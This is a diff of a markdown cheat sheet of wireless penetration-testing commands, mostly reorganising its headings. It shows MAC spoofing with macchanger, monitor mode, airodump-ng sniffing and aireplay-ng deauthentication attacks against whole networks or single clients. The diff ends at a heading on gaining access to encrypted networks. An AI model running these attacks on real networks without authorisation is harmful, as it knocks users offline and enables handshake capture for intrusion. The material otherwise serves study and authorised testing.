@@ -1,11 +1,12 @@
-# Change MAC-address
+# Network Penetration Testing
+## Change MAC-address
 ```
 > ifconfig [interface] down
 > macchanger -m [MAC] [interface]
 > ifco`fig [interface] up
 ```
 
-# Enable monitor mode
+## Enable monitor mode
 
 Monitordevice has different name than interface
 
@@ -20,7 +21,8 @@ Monitordevice has the same name than interface
 > ifconfig [interface] up
 ```
 
-# Start general packet sniffing
+# Network Penetration Testing - Pre Connection Attacks
+## Start general packet sniffing
 
 ```
 > airodump-ng [interface]
@@ -31,7 +33,7 @@ Example:
 ```
 
 
-# Start targeted packet sniffing
+## Start targeted packet sniffing
 
 ```
 > airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]
@@ -41,20 +43,27 @@ Example:
 > airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0
 ```
 # Deauthentication attacks
-To disconnect a device from the AP to let it reauthenticate 
-------------------------------------------
+## To disconnect a device from the AP to let it reauthenticate 
 
 To de-authenticate all clients in a specific network
+```
+> aireplay-ng --deauth [number of packets] -a [AP] [INTERFACE]
 
-`> aireplay-ng --deauth [number of packets] -a [AP] [INTERFACE]`
-Ex: `> aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 mon0`
+Example: 
+
+> aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 mon0
+```
 
 To de-authenticate a specific client in a network
+```
+> aireplay-ng --deauth [number of deauth packets] -a [AP] -c [target] [interface]
 
-`> aireplay-ng --deauth [number of deauth packets] -a [AP] -c [target] [interface]`
-Ex: `> aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:11:22:33:44 mon0`
+Example: 
 
-______________________________________________________________________________
+> aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:11:22:33:44 mon0
+
+```
+
 # Gaining access to encrypted networks 
 ------------------------------------------------------------------------------
 
